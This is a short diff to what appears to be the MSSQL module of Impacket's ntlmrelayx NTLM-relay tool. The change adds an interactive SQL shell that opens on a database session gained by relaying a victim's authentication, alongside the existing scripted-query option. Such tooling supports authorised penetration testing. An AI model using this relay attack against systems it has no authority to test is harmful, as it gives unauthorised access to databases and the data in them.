@@ -13,8 +13,10 @@
 # Authors:
 #   Alberto Solino (@agsolino)
 #   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
+#   Sylvain Heiniger (@sploutchy) / Compass Security (https://www.compass-security.com)
 #
 from impacket import LOG
+from impacket.examples.mssqlshell import SQLSHELL
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
 
 PROTOCOL_ATTACK_CLASS = "MSSQLAttack"
@@ -22,11 +24,16 @@ PROTOCOL_ATTACK_CLASS = "MSSQLAttack"
 class MSSQLAttack(ProtocolAttack):
     PLUGIN_NAMES = ["MSSQL"]
     def run(self):
-        if self.config.queries is None:
-            LOG.error('No SQL queries specified for MSSQL relay!')
-        else:
+        if self.config.queries is not None:
             for query in self.config.queries:
                 LOG.info('Executing SQL: %s' % query)
                 self.client.sql_query(query)
                 self.client.printReplies()
                 self.client.printRows()
+        elif self.config.interactive is True:
+            shell = SQLSHELL(self.client)
+            shell.cmdloop()
+            return
+        else:
+            LOG.error('No SQL queries specified for MSSQL relay!')
+
